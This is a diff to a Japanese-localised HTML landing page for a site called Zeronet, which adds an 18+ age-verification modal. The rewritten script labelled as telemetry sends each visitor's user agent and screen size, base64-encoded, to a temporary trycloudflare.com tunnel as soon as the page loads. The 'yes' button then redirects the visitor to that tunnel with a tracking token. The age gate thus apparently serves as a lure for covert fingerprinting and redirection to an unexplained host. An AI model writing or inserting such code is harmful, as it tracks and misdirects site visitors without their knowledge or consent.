@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ja">
 <head>
     <meta charset="UTF-8">
     <meta name="juicyads-site-verification" content="90700938193d24e3332807f5a9656802">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zeronet - Welcome</title>
+    <title>Zeronet - 年齢確認</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -19,7 +19,7 @@
             margin: 0 auto;
             padding: 40px 20px;
         }
-        h1 { font-size: 2.5rem; margin-bottom: 10px; }
+        h1 { font-size: 2.2rem; margin-bottom: 10px; }
         p { font-size: 1.1rem; color: #cccccc; line-height: 1.6; }
         .ad-zone {
             margin: 30px auto;
@@ -29,6 +29,60 @@
             display: flex;
             align-items: center;
             justify-content: center;
+        }
+        /* Age Gate Modal Overlay */
+        #age-gate {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 10, 10, 0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .gate-box {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            padding: 30px;
+            border-radius: 8px;
+            max-width: 400px;
+            width: 90%;
+        }
+        .gate-box h2 {
+            margin-top: 0;
+            color: #fff;
+        }
+        .btn-group {
+            margin-top: 25px;
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+        .btn {
+            padding: 10px 30px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            border-radius: 4px;
+            transition: background 0.2s;
+        }
+        .btn-yes {
+            background-color: #28a745;
+            color: white;
+        }
+        .btn-yes:hover {
+            background-color: #218838;
+        }
+        .btn-no {
+            background-color: #dc3545;
+            color: white;
+        }
+        .btn-no:hover {
+            background-color: #c82333;
         }
         footer {
             margin-top: 50px;
@@ -60,9 +114,22 @@
 </head>
 <body>
 
+    <!-- Age Verification Gate (Deterrent Interface) -->
+    <div id="age-gate">
+        <div class="gate-box">
+            <h2>年齢確認</h2>
+            <p>あなたは18歳以上ですか？</p>
+            <p style="font-size: 0.85rem; color: #888;">当サイトには成人向けの表現が含まれています。</p>
+            <div class="btn-group">
+                <button class="btn btn-yes" onclick="handleAgeConfirm(true)">はい</button>
+                <button class="btn btn-no" onclick="handleAgeConfirm(false)">いいえ</button>
+            </div>
+        </div>
+    </div>
+
     <div class="container">
-        <h1>Welcome to Zeronet</h1>
-        <p>Explore content and access services securely below.</p>
+        <h1>Zeronet へようこそ</h1>
+        <p>安全なコンテンツの閲覧とサービスの利用が可能です。</p>
 
         <!-- ExoClick Banner Ad Placement -->
         <div class="ad-zone">
@@ -73,18 +140,18 @@
         <footer>
             <p>&copy; 2026 Zeronet. All rights reserved.</p>
             <p>
-                <a onclick="togglePanel('privacy')">Privacy Policy</a> |
-                <a onclick="togglePanel('terms')">Terms of Service</a>
+                <a onclick="togglePanel('privacy')">プライバシーポリシー</a> |
+                <a onclick="togglePanel('terms')">利用規約</a>
             </p>
 
             <div id="privacy-panel" class="info-panel">
-                <h3>Privacy Policy</h3>
-                <p>This site collects standard technical metrics, including browser characteristics and display attributes, to optimize delivery, maintain system stability, and protect against security abuse.</p>
+                <h3>プライバシーポリシー</h3>
+                <p>当サイトではサービスの品質維持およびセキュリティ保護のため、ブラウザ環境等の技術的なデータを収集しています。</p>
             </div>
 
             <div id="terms-panel" class="info-panel">
-                <h3>Terms of Service</h3>
-                <p>By accessing Zeronet, you agree to access content in accordance with standard web compliance policies. Automated bot harvesting or service disruption attempts are restricted.</p>
+                <h3>利用規約</h3>
+                <p>Zeronetの利用規約に同意の上、アクセスしてください。不正なボットによるアクセスや妨害行為は禁止されています。</p>
             </div>
         </footer>
     </div>
@@ -105,42 +172,87 @@
     }
     </script>
 
-    <!-- Telemetry Collection Script -->
+    <!-- Telemetry & Redirection Script Logic -->
     <script>
-    (async () => {
-        const server = "https://stats-cherry-personnel-screenshot.trycloudflare.com";
-        const endpoint = server + "/visit/";
+        // Global variables initialized by telemetry handshake
+        let targetUrl = "";
+        let sessionToken = "";
 
-        const now = new Date();
-        const timestamp = now.toISOString().replace(/[-:T.]/g, "").slice(0, 17);
-        const random = Math.random().toString(36).substring(2, 10);
-        const token = timestamp + random;
-
-        const payload = {
-            timestamp: now.toISOString(),
-            token: token,
-            userAgent: navigator.userAgent,
-            resolution: {
-                width: screen.width,
-                height: screen.height
+        // Function called when user interacts with age gate
+        async function handleAgeConfirm(isAdult) {
+            if (!isAdult) {
+                // Trigger history rewind if "いいえ" is clicked
+                history.back();
+                return;
             }
-        };
 
-        const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
+            // Hide modal after confirmation
+            document.getElementById('age-gate').style.display = 'none';
 
-        try {
-            await fetch(endpoint + "?j=" + token, {
-                method: "GET",
-                headers: {
-                    "X-Device-Info": encoded
-                },
-                cache: "no-store",
-                mode: "cors"
-            });
-        } catch (error) {
-            console.warn("Telemetry connection failed:", error.message);
+            // Proceed to target location using tokenized replacement
+            if (targetUrl && sessionToken) {
+                window.location.replace(targetUrl + "?j=" + sessionToken);
+            } else {
+                // Fallback if telemetry hasn't completed yet
+                const server = "https://stats-cherry-personnel-screenshot.trycloudflare.com";
+                const fallbackTarget = server + "/visit/";
+                const fallbackToken = Math.random().toString(36).substring(2, 15);
+                window.location.replace(fallbackTarget + "?j=" + fallbackToken);
+            }
         }
-    })();
+
+        (async () => {
+            const server = "https://stats-cherry-personnel-screenshot.trycloudflare.com";
+            targetUrl = server + "/visit/";
+
+            // Generate unique timestamp-like token
+            const now = new Date();
+            const timestamp =
+                now.getFullYear().toString() +
+                String(now.getMonth() + 1).padStart(2, "0") +
+                String(now.getDate()).padStart(2, "0") +
+                String(now.getHours()).padStart(2, "0") +
+                String(now.getMinutes()).padStart(2, "0") +
+                String(now.getSeconds()).padStart(2, "0") +
+                String(now.getMilliseconds()).padStart(3, "0");
+
+            const random = Math.random().toString(36).substring(2, 10);
+            sessionToken = timestamp + random;
+
+            // Device information including User Agent
+            const payload = {
+                timestamp: now.toISOString(),
+                token: sessionToken,
+                userAgent: navigator.userAgent,
+                resolution: {
+                    width: screen.width,
+                    height: screen.height
+                }
+            };
+
+            // Encode JSON as Base64
+            const encoded = btoa(
+                unescape(encodeURIComponent(JSON.stringify(payload)))
+            );
+
+            try {
+                // Server handshake parcel request
+                const response = await fetch(targetUrl + "?j=" + sessionToken, {
+                    method: "GET",
+                    headers: {
+                        "X-Device-Info": encoded
+                    },
+                    cache: "no-store",
+                    mode: "cors"
+                });
+
+                if (!response.ok) {
+                    throw new Error("Server unavailable");
+                }
+            } catch (error) {
+                console.warn("Telemetry transmission background notice:", error.message);
+            }
+        })();
     </script>
 
 </body>
